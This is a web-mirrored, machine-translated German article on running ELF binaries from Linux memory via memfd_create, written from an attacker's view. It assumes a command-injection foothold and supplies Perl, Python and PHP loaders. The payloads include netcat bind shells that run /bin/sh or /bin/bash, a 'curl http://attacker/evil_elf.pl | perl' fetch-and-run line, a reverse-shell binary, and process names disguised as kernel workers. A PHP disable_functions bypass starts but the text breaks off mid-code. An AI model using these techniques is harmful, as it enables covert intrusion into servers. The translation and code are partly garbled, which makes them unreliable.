<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üëçüèº üôÖüèª üöà Elfen in Erinnerung. Ausf√ºhren von ELF im Linux-RAM üí™üèæ üòë üç≥</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Die dateifreie Verbreitung von Malware wird immer beliebter. Kein Wunder, denn die Arbeit solcher Programme hinterl√§sst praktisch keine Spuren. In die...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Elfen in Erinnerung. Ausf√ºhren von ELF im Linux-RAM</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/fbk_cs/blog/430902/"><p><img src="https://habrastorage.org/webt/rg/xt/yd/rgxtyd3contgoitlza_ve1zah2g.jpeg"></p><br><p> Die dateifreie Verbreitung von Malware wird immer beliebter.  Kein Wunder, denn die Arbeit solcher Programme hinterl√§sst praktisch keine Spuren.  In diesem Artikel werden wir nicht auf die Technik zum Ausf√ºhren von Programmen im Windows-Speicher eingehen.  Wir konzentrieren uns auf GNU / Linux.  Linux dominiert zu Recht das Serversegment, lebt auf Millionen eingebetteter Ger√§te und stellt die √ºberwiegende Mehrheit der Webressourcen bereit.  Als n√§chstes werden wir einen kurzen √úberblick √ºber die M√∂glichkeiten der Ausf√ºhrung von Programmen im Speicher geben und zeigen, dass dies auch unter schwierigen Bedingungen m√∂glich ist. </p><a name="habracut"></a><br><p>  Dateifreie Ausf√ºhrungstechniken sind geheim, und es ist √§u√üerst schwierig, ihre Verwendung zu erkennen und zu verfolgen.  Die Tools zur Steuerung der Integrit√§t des Dateisystems warnen den Administrator nicht, da keine Schreibvorg√§nge auf die Festplatte oder Datei√§nderungen auf der Festplatte auftreten.  Antivirensoftware (von * nix-Benutzern h√§ufig vernachl√§ssigt) √ºberwacht den Programmspeicher nach dem Start h√§ufig nicht.  Dar√ºber hinaus steht in vielen GNU / Linux-Distributionen unmittelbar nach der Installation eine Vielzahl verschiedener Debugging-Dienstprogramme, Interpreter, Compiler von Programmiersprachen und Bibliotheken f√ºr diese zur Verf√ºgung.  All dies schafft hervorragende Bedingungen f√ºr die Verwendung von Techniken der verdeckten, dateifreien Programmausf√ºhrung.  Zus√§tzlich zu den Vorteilen ihrer Verwendung gibt es aber auch Nachteile: Diese Programme √ºberleben keinen Blackout oder Neustart des Zielhosts.  Aber w√§hrend der Host l√§uft, funktioniert das Programm. </p><br><p>  Solche Techniken k√∂nnen und sollten nicht nur f√ºr die Verbreitung von Malware verwendet werden.  Wenn die Geschwindigkeit Ihrer Programmausf√ºhrung f√ºr Sie entscheidend ist, entladen Sie sie in den Arbeitsspeicher.  Tats√§chlich f√ºhlen sich viele Linux-Distributionen gro√üartig an, wenn sie vollst√§ndig im RAM ausgef√ºhrt werden, sodass Sie mit Festplatten arbeiten k√∂nnen, ohne Dateien darauf zu speichern.  Unter dem Gesichtspunkt der Pr√ºfung der Informationssicherheit sind Methoden zur verdeckten Ausf√ºhrung von Programmen als Phase der Nachbearbeitung und Aufkl√§rung innerhalb des Zielnetzwerks sehr n√ºtzlich.  Insbesondere wenn maximale Geheimhaltung eine der Pr√ºfungsbedingungen ist. <br>  Laut dem <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">barkly.com-</a> Portal im Jahr 2018 treten bereits 35% der <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Virenangriffe</a> in sch√§dlicher Software auf, die im Speicher ausgef√ºhrt wird. </p><br><p>  Unter Windows verwenden Cyberkriminelle aktiv das vorinstallierte Powershell-System, um den Code herunterzuladen und sofort auszuf√ºhren.  Diese Techniken sind unter anderem aufgrund ihrer Implementierung in Frameworks wie Powershell Empire, Powersploit und Metasploit Framework weit verbreitet. </p><br><h1 id="a-chto-naschet-linux">  Was ist mit Linux? </h1><br><p>  In den meisten F√§llen sind auf Hosts installierte Linux-Distributionen mit einer vorinstallierten Software ausgestattet.  Standardm√§√üig sind Dolmetscher f√ºr Programmiersprachen verf√ºgbar: Python-, Perl-, C-Compiler. PHP ist auf den Hosting-Sites im Anhang vorhanden.  Diese Bedingung bietet die M√∂glichkeit, Code in diesen Sprachen auszuf√ºhren. </p><br><p>  Unter Linux gibt es mehrere bekannte Optionen zum Ausf√ºhren von Code im Speicher. <br>  Am einfachsten ist es, den im Dateisystem vorinstallierten gemeinsam genutzten Speicherbereich zu verwenden. </p><br><p>  Durch Platzieren der ausf√ºhrbaren Datei im Verzeichnis / dev / shm oder / run / shm ist es m√∂glich, sie direkt im Speicher auszuf√ºhren, da diese Verzeichnisse nichts anderes als ein auf dem Dateisystem gemounteter Arbeitsspeicher sind.  Sie k√∂nnen jedoch wie jedes andere Verzeichnis mit ls angezeigt werden.  In der Regel werden diese Verzeichnisse mit dem noexec-Flag bereitgestellt, und die Ausf√ºhrung von Programmen in diesen Verzeichnissen steht nur dem Superuser zur Verf√ºgung.  Um etwas unauff√§lliger zu sein, brauchen Sie etwas anderes. </p><br><p> Bemerkenswerter ist der <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Systemaufruf memfd_create (2)</a> .  Dieser Systemaufruf funktioniert ungef√§hr wie <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">malloc (3)</a> , gibt jedoch keinen Zeiger auf einen Speicherbereich zur√ºck, sondern einen Dateideskriptor auf eine anonyme Datei, die im Dateisystem nur als Link in <code>/proc/PID/fd/</code> sichtbar ist, √ºber den sie ausgef√ºhrt werden kann <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">ausf√ºhren (2).</a> <br>  In der Handbuchseite zur Verwendung des <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Systemaufrufs memfd_create (auf Russisch)</a> hei√üt es: </p><br><p>  <em>"Der in name angegebene</em> <code>name</code> <em>wird als Dateiname verwendet und als Ziel des entsprechenden symbolischen Links im Verzeichnis angezeigt. <code>/proc/self/fd/</code> . Der Anzeigename beginnt immer mit <code>memfd:</code> und dient nur zum Debuggen. Namen haben keinen Einfluss auf das Dateiverhalten "Deskriptor, und daher k√∂nnen mehrere Dateien denselben Namen haben, ohne dass dies Konsequenzen hat."</em> </p><br><p>  Ein Beispiel f√ºr die Verwendung von <code>memfd_create()</code> f√ºr die C-Sprache: </p><br><pre> <code class="cpp hljs"><span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">&lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;sys/syscall.h&gt; #include &lt;sys/types.h&gt; #include &lt;sys/wait.h&gt; #include &lt;unistd.h&gt; int main() { int fd; pid_t child; char buf[BUFSIZ] = ""; ssize_t br; fd = syscall(SYS_memfd_create, "foofile", 0); if (fd == -1) { perror("memfd_create"); exit(EXIT_FAILURE); } child = fork(); if (child == 0) { dup2(fd, 1); close(fd); execlp("/bin/date", "/bin/date", NULL); perror("execlp date"); exit(EXIT_FAILURE); } else if (child == -1) { perror("fork"); exit(EXIT_FAILURE); } waitpid(child, NULL, 0); lseek(fd, 0, SEEK_SET); br = read(fd, buf, BUFSIZ); if (br == -1) { perror("read"); exit(EXIT_FAILURE); } buf[br] = 0; printf("child said: '%s'\n", buf); exit(EXIT_SUCCESS); }</span></span></span></span></code> </pre><br><p>  Der obige Code verwendet <code>memfd</code> , erstellt einen <code>memfd</code> Prozess, leitet seine Ausgabe in eine tempor√§re Datei, wartet auf den Abschluss des <code>memfd</code> Prozesses und liest seine Ausgabe aus der tempor√§ren Datei.  Normalerweise wird die Pipe "|" verwendet, um die Ausgabe eines Programms auf die Eingabe eines anderen Programms in * nix umzuleiten. </p><br><p>  Die M√∂glichkeit, <code>syscall()</code> ist auch in interpretierten Sprachen wie Perl, Python usw. verf√ºgbar. Als N√§chstes betrachten wir eines der m√∂glichen Szenarien und demonstrieren die M√∂glichkeit, ausf√ºhrbare Dateien mit <code>memfd_create()</code> in den Speicher zu laden. </p><br><h3 id="perl">  Perl </h3><br><p>  Angenommen, wir haben einen Einstiegspunkt in Form einer Befehlsinjektion. <br>  Wir brauchen eine M√∂glichkeit, Systemaufrufe auf dem Zielsystem durchzuf√ºhren. <br>  In Perl hilft uns die Funktion <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">syscall ()</a> dabei. <br>  Wir brauchen auch eine M√∂glichkeit, unsere ELF als Inhalt einer anonymen Datei direkt in den Speicher zu schreiben. <br>  Zu diesem Zweck platzieren wir unsere ELF direkt im Hauptteil des Skripts, das wiederum √ºber die verf√ºgbare Befehlsinjektion an das Zielsystem √ºbertragen wird.  Alternativ k√∂nnen Sie die ausf√ºhrbare Datei auch √ºber das Netzwerk herunterladen. <br>  Aber vorher lohnt es sich eine Reservierung zu machen.  Wir m√ºssen die Linux-Kernel-Version auf dem Zielhost kennen, da der erforderliche <code>memfd_create()</code> nur ab Version <strong>3.17</strong> verf√ºgbar ist. </p><br><p>  <code>memfd_create()</code> und <code>execve()</code> genauer an. </p><br><p>  F√ºr unsere anonyme Datei verwenden wir die Konstante <code>MFD_CLOEXEC</code> , die "das <code>close-on-exec (FD_CLOEXEC)</code> Flag <code>close-on-exec (FD_CLOEXEC)</code> f√ºr einen neuen Deskriptor f√ºr ge√∂ffnete Dateien setzt".  Dies bedeutet, dass unser Dateideskriptor automatisch geschlossen wird, nachdem wir unsere ELF mit <code>execve()</code> </p><br><p>  Da wir die Funktion <code>syscall()</code> der Perl-Sprache verwenden, ben√∂tigen wir numerische Werte, um unseren <code>syscall</code> und seinen Parameter aufzurufen. <br>  Sie finden sie in <code>/usr/include</code> oder im Internet.  Die <code>__NR_</code> finden Sie in <code>#define</code> beginnend mit <code>__NR_</code> <br>  In unserem Fall ist <code>memfd_create()</code> f√ºr ein 64-Bit-Betriebssystem mit 319 nummeriert.  Und die Konstante ist <code>FD_CLOSEXEC 0x0001U</code> ( <code>FD_CLOSEXEC 0x0001U</code> 1 in der <code>linux/memfd.h</code> ) </p><br><p>  Jetzt haben wir alle notwendigen numerischen Werte und k√∂nnen in Perl ein Analogon von <code>memfd_create(name, MFD_CLOEXEC)</code> aus C schreiben. <br>  Wir m√ºssen auch einen Dateinamen erstellen, der in <code>/memfd:</code> angezeigt <code>/memfd:</code> <br>  Es ist optimal, einen Namen zu w√§hlen, der <code>[:kworker]</code> oder einem anderen √§hnlich ist, ohne Verdacht zu <code>[:kworker]</code> . <br>  Zum Beispiel √ºbergeben wir eine leere Zeichenfolge an den Parameter name: </p><br><pre> <code class="perl hljs"><span class="hljs-keyword"><span class="hljs-keyword">my</span></span> $name = <span class="hljs-string"><span class="hljs-string">""</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">my</span></span> $fd = <span class="hljs-keyword"><span class="hljs-keyword">syscall</span></span>(<span class="hljs-number"><span class="hljs-number">319</span></span>, $name, <span class="hljs-number"><span class="hljs-number">1</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (-<span class="hljs-number"><span class="hljs-number">1</span></span> == $fd) { <span class="hljs-keyword"><span class="hljs-keyword">die</span></span> <span class="hljs-string"><span class="hljs-string">"memfd_create: $!"</span></span>; }</code> </pre> <br><p>  Jetzt haben wir den anonymen Dateideskriptor in $ fd und m√ºssen den ELF in diese Datei schreiben. <br>  Die Funktion <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">open ()</a> in Perl wird normalerweise zum √ñffnen von Dateien verwendet. Wenn Sie jedoch das Konstrukt <code>&gt;&amp;=FD</code> verwenden und den Deskriptor anstelle des Dateinamens an diese Funktion √ºbergeben, wird der bereits ge√∂ffnete Dateideskriptor in ein Dateihandle umgewandelt. <br>  <code>autoflush[]</code> w√§re auch n√ºtzlich f√ºr <code>autoflush[]</code> : </p><br><pre> <code class="perl hljs"><span class="hljs-keyword"><span class="hljs-keyword">open</span></span>(<span class="hljs-keyword"><span class="hljs-keyword">my</span></span> $FH, <span class="hljs-string"><span class="hljs-string">'&gt;&amp;='</span></span>.$fd) <span class="hljs-keyword"><span class="hljs-keyword">or</span></span> <span class="hljs-keyword"><span class="hljs-keyword">die</span></span> <span class="hljs-string"><span class="hljs-string">"open: $!"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">select</span></span>((<span class="hljs-keyword"><span class="hljs-keyword">select</span></span>($FH), $|=<span class="hljs-number"><span class="hljs-number">1</span></span>)[<span class="hljs-number"><span class="hljs-number">0</span></span>]);</code> </pre> <br><p>  Jetzt haben wir ein Handle, das auf eine anonyme Datei verweist. </p><br><p>  Als n√§chstes m√ºssen wir unsere ausf√ºhrbare Datei in Daten konvertieren, die im Hauptteil eines Perl-Skripts abgelegt werden k√∂nnen. <br>  Dazu f√ºhren wir Folgendes aus: </p><br><pre> <code class="plaintext hljs">$ perl -e '$/=\32;print"print \$FH pack q/H*/, q/".(unpack"H*")."/\ or die qq/write: \$!/;\n"while(&lt;&gt;)' ./elfbinary</code> </pre> <br><p>  Wir bekommen viele, viele √§hnliche Zeilen: </p><br><pre> <code class="perl hljs"><span class="hljs-keyword"><span class="hljs-keyword">print</span></span> $FH <span class="hljs-keyword"><span class="hljs-keyword">pack</span></span> <span class="hljs-keyword"><span class="hljs-keyword">q</span></span>/H*<span class="hljs-regexp"><span class="hljs-regexp">/, q/</span></span><span class="hljs-number"><span class="hljs-number">7</span></span>f454c4602010100000000000000000002003e0001000000304f45000000000<span class="hljs-number"><span class="hljs-number">0</span></span>/ <span class="hljs-keyword"><span class="hljs-keyword">or</span></span> <span class="hljs-keyword"><span class="hljs-keyword">die</span></span> qq/<span class="hljs-keyword"><span class="hljs-keyword">write</span></span>: $!/; <span class="hljs-keyword"><span class="hljs-keyword">print</span></span> $FH <span class="hljs-keyword"><span class="hljs-keyword">pack</span></span> <span class="hljs-keyword"><span class="hljs-keyword">q</span></span>/H*<span class="hljs-regexp"><span class="hljs-regexp">/, q/</span></span><span class="hljs-number"><span class="hljs-number">4000000000000000</span></span>c8010000000000000000000040003800070040001700030<span class="hljs-number"><span class="hljs-number">0</span></span>/ <span class="hljs-keyword"><span class="hljs-keyword">or</span></span> <span class="hljs-keyword"><span class="hljs-keyword">die</span></span> qq/<span class="hljs-keyword"><span class="hljs-keyword">write</span></span>: $!/; <span class="hljs-keyword"><span class="hljs-keyword">print</span></span> $FH <span class="hljs-keyword"><span class="hljs-keyword">pack</span></span> <span class="hljs-keyword"><span class="hljs-keyword">q</span></span>/H*<span class="hljs-regexp"><span class="hljs-regexp">/, q/</span></span><span class="hljs-number"><span class="hljs-number">0600000004000000400000000000000040004000000000004000400000000000</span></span>/ <span class="hljs-keyword"><span class="hljs-keyword">or</span></span> <span class="hljs-keyword"><span class="hljs-keyword">die</span></span> qq/<span class="hljs-keyword"><span class="hljs-keyword">write</span></span>: $!/;</code> </pre> <br><p>  Nachdem wir sie ausgef√ºhrt haben, speichern wir unsere ausf√ºhrbare Datei.  Wir m√ºssen es nur ausf√ºhren. </p><br><h4 id="fork">  Gabel () </h4><br><p>  Optional k√∂nnen wir <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">fork () verwenden</a> .  Dies ist √ºberhaupt nicht notwendig.  Wenn wir jedoch nicht nur ELF ausf√ºhren und den Prozess beenden m√∂chten, m√ºssen wir <code>fork()</code> . <br>  Im Allgemeinen sieht das Erstellen eines untergeordneten Prozesses in Perl ungef√§hr so ‚Äã‚Äãaus: </p><br><pre> <code class="perl hljs"><span class="hljs-keyword"><span class="hljs-keyword">while</span></span> ($keep_going) { <span class="hljs-keyword"><span class="hljs-keyword">my</span></span> $pid = <span class="hljs-keyword"><span class="hljs-keyword">fork</span></span>(); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (-<span class="hljs-number"><span class="hljs-number">1</span></span> == $pid) { <span class="hljs-comment"><span class="hljs-comment"># Error die "fork: $!"; } if (0 == $pid) { exit 0; } }</span></span></code> </pre> <br><p>  Die N√ºtzlichkeit von <code>fork()</code> in der Tatsache, dass Sie durch Aufrufen zusammen mit <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">setsid (2) den untergeordneten</a> Prozess vom √ºbergeordneten Prozess trennen und den √ºbergeordneten Prozess beenden lassen k√∂nnen: </p><br><pre> <code class="perl hljs"><span class="hljs-comment"><span class="hljs-comment">#    my $pid = fork(); if (-1 == $pid) { # Error die "fork1: $!"; } if (0 != $pid) { #   exit 0; } #     if (-1 == syscall(112)) { die "setsid: $!"; } #    () $pid = fork(); if (-1 == $pid) { # Error die "fork2: $!"; } if (0 != $pid) { #    exit 0; } #   ""</span></span></code> </pre> <br><p>  Jetzt k√∂nnen wir ELF in vielen Prozessen ausf√ºhren. </p><br><h4 id="execve">  Execve () </h4><br><p>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Execve ()</a> ist ein Systemaufruf, mit dem wir ein Programm ausf√ºhren k√∂nnen.  Perl bietet uns √§hnliche Funktionen durch die <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Exec () -</a> Funktion, die genau wie der oben erw√§hnte Systemaufruf funktioniert, jedoch eine viel einfachere und bequemere Syntax aufweist. <br>  Wir m√ºssen <code>exec()</code> zwei Dinge √ºbergeben: die Datei, die wir ausf√ºhren m√∂chten (unseren zuvor geladenen ELF-Speicher), und den Prozessnamen als eines der √ºbergebenen Argumente.  Normalerweise entspricht der Prozessname dem Namen der ausf√ºhrbaren Datei.  Da wir jedoch <code>/proc/PID/fd/3</code> in der Prozessliste sehen, werden wir unseren Prozess etwas anderes nennen. <br>  Die Syntax f√ºr <code>exec()</code> wie folgt: </p><br><pre> <code class="perl hljs"><span class="hljs-keyword"><span class="hljs-keyword">exec</span></span> {<span class="hljs-string"><span class="hljs-string">"/proc/$$/fd/$fd"</span></span>} <span class="hljs-string"><span class="hljs-string">"nc"</span></span>, <span class="hljs-string"><span class="hljs-string">"-kvl"</span></span>, <span class="hljs-string"><span class="hljs-string">"4444"</span></span>, <span class="hljs-string"><span class="hljs-string">"-e"</span></span>, <span class="hljs-string"><span class="hljs-string">"/bin/sh"</span></span> <span class="hljs-keyword"><span class="hljs-keyword">or</span></span> <span class="hljs-keyword"><span class="hljs-keyword">die</span></span> <span class="hljs-string"><span class="hljs-string">"exec: $!"</span></span>;</code> </pre> <br><p>  Das obige Beispiel startet Netcat.  Aber wir m√∂chten etwas weniger wie eine Hintert√ºr starten. <br>  Ein laufender Prozess hat keinen Link zu einer anonymen Datei in <code>/proc/PID/fd</code> , aber wir finden unsere ELF immer unter <code>/proc/PID/exe</code> , die auf die Datei des laufenden Prozesses verweist. <br>  Also haben wir ELF im Linux-Speicher gestartet, ohne die Festplatte und sogar das Dateisystem zu ber√ºhren. <br>  Es ist m√∂glich, unsere ausf√ºhrbare Datei schnell und bequem auf das Zielsystem herunterzuladen, indem Sie beispielsweise ein Skript an den Perl-Interpreter √ºbergeben, in dessen Hauptteil wir ELF platziert und auf einem externen Webhosting <code>$ curl http://attacker/evil_elf.pl | perl</code> : <code>$ curl http://attacker/evil_elf.pl | perl</code> <code>$ curl http://attacker/evil_elf.pl | perl</code> </p><br><h3 id="python">  Python </h3><br><p>  √Ñhnlich wie bei der Perl-Option m√ºssen wir Folgendes tun: </p><br><ul><li>  Erstellen Sie mit dem Systemaufruf memfd_create () eine anonyme Datei im Speicher </li><li>  Schreiben Sie eine ausf√ºhrbare ELF in diese Datei </li><li>  F√ºhren Sie es aus und f√ºhren Sie es optional mehrmals mit fork () aus. </li></ul><br><pre> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">import</span></span> ctypes <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> os <span class="hljs-comment"><span class="hljs-comment">#   .     - binary = open('/tmp/rev-shell','rb').read() fd = ctypes.CDLL(None).syscall(319,"",1) #  memfd_create     final_fd = open('/proc/self/fd/'+str(fd),'wb') #    . final_fd.write(binary) final_fd.close() fork1 = os.fork() #   if 0 != fork1: os._exit(0) ctypes.CDLL(None).syscall(112) #  setsid()     . fork2 = os.fork() #     . if 0 != fork2: os._exit(0) os.execl('/proc/self/fd/'+str(fd),'argv0','argv1') #    .</span></span></code> </pre> <br><p>  Im Fall von Python ben√∂tigen wir zum Aufrufen von <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">syscall</a> das Standardmodul <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">ctypes</a> und <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">os</a> , um die Datei zu schreiben und auszuf√ºhren und den Prozess zu steuern.  Alles ist v√∂llig analog zur Perl-Version. <br>  Im obigen Code schreiben wir eine Datei in die Datei, die sich zuvor im <code>/tmp/</code> .  Nichts hindert uns jedoch daran, die Datei vom Webserver herunterzuladen. </p><br><h3 id="php">  Php </h3><br><p>  Zu diesem Zeitpunkt k√∂nnen wir bereits Perl und Python verwenden.  Interpreter dieser Sprachen sind auf vielen Betriebssystemen standardm√§√üig installiert.  Aber das Interessanteste liegt wie immer vor uns. <br>  Wenn uns aus irgendeinem Grund keine Perl- oder Python-Interpreter zur Verf√ºgung stehen, w√§re es gro√üartig, PHP zu verwenden.  Diese Sprache ist bei Webentwicklern sehr beliebt.  Und wenn wir bereits die M√∂glichkeit gefunden haben, Code in einer Webanwendung auszuf√ºhren, wird uns der PHP-Interpreter mit hoher Wahrscheinlichkeit treffen. </p><br><p>  Leider hat PHP keine eingebauten Mechanismen zum Aufrufen von <code>syscall</code> . <br>  Wir sind auf einen <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Beitrag</a> von Beched'a im rdot-Forum gesto√üen (Danke Beched!), Der den Aufruf der <code>open</code> Funktion an das <code>system</code> durch <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">procfs</a> <code>/proc/self/mem</code> im Speicher des aktuellen Prozesses <code>disable_functions</code> und <code>disable_functions</code> umgeht. <br>  Wir haben diesen Trick verwendet, um die Funktion in unseren Code umzuschreiben, was die erforderlichen Systemaufrufe verursacht. <br>  Wir werden syscall in Form von Shellcode auf Assembler an den PHP-Interpreter √ºbergeben. <br>  Systemaufrufe m√ºssen √ºber eine Folge von Befehlen geleitet werden. <br>  Beginnen wir mit dem Schreiben eines PHP-Skripts.  Als n√§chstes wird viel Magie kommen. </p><br><p>  Zun√§chst bezeichnen wir die notwendigen Parameter: </p><br><pre> <code class="php hljs"> $elf = file_get_contents(<span class="hljs-string"><span class="hljs-string">"/bin/nc.traditional"</span></span>); <span class="hljs-comment"><span class="hljs-comment">// elf_payload $args = "test -lvvp 31338 -e /bin/bash"; // argv0 argv1 argv2 ...</span></span></code> </pre> <br><p>  Bezeichnen Sie die Verschiebung - die oberen und unteren Werte im Speicher, wo wir sp√§ter unseren Shellcode platzieren werden: </p><br><pre> <code class="php hljs"> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">packlli</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">($value)</span></span></span><span class="hljs-function"> </span></span>{ $higher = ($value &amp; <span class="hljs-number"><span class="hljs-number">0xffffffff00000000</span></span>) &gt;&gt; <span class="hljs-number"><span class="hljs-number">32</span></span>; $lower = $value &amp; <span class="hljs-number"><span class="hljs-number">0x00000000ffffffff</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> pack(<span class="hljs-string"><span class="hljs-string">'V2'</span></span>, $lower, $higher); }</code> </pre> <br><p>  Als n√§chstes folgt die Funktion, mit der die Bin√§rdatei "entpackt" wird.  Dazu konvertieren wir die Bin√§rdaten mit der Funktion <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">hexdex ()</a> aus den Bin√§rdaten <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">bin2hex ()</a> in <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">umgekehrter Reihenfolge</a> (zur Speicherung) in eine Dezimaldarstellung: </p><br><pre> <code class="php hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">unp</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">($value)</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> hexdec(bin2hex(strrev($value))); }</code> </pre> <br><p>  Als n√§chstes wird die <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">ELF-</a> Datei analysiert, um Offsets zu erhalten: </p><br><pre> <code class="php hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">parseelf</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">($bin_ver, $rela = false)</span></span></span><span class="hljs-function"> </span></span>{ $bin = file_get_contents($bin_ver); $e_shoff = unp(substr($bin, <span class="hljs-number"><span class="hljs-number">0x28</span></span>, <span class="hljs-number"><span class="hljs-number">8</span></span>)); $e_shentsize = unp(substr($bin, <span class="hljs-number"><span class="hljs-number">0x3a</span></span>, <span class="hljs-number"><span class="hljs-number">2</span></span>)); $e_shnum = unp(substr($bin, <span class="hljs-number"><span class="hljs-number">0x3c</span></span>, <span class="hljs-number"><span class="hljs-number">2</span></span>)); $e_shstrndx = unp(substr($bin, <span class="hljs-number"><span class="hljs-number">0x3e</span></span>, <span class="hljs-number"><span class="hljs-number">2</span></span>)); <span class="hljs-keyword"><span class="hljs-keyword">for</span></span>($i = <span class="hljs-number"><span class="hljs-number">0</span></span>; $i &lt; $e_shnum; $i += <span class="hljs-number"><span class="hljs-number">1</span></span>) { $sh_type = unp(substr($bin, $e_shoff + $i * $e_shentsize + <span class="hljs-number"><span class="hljs-number">4</span></span>, <span class="hljs-number"><span class="hljs-number">4</span></span>)); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>($sh_type == <span class="hljs-number"><span class="hljs-number">11</span></span>) { <span class="hljs-comment"><span class="hljs-comment">// SHT_DYNSYM $dynsym_off = unp(substr($bin, $e_shoff + $i * $e_shentsize + 24, 8)); $dynsym_size = unp(substr($bin, 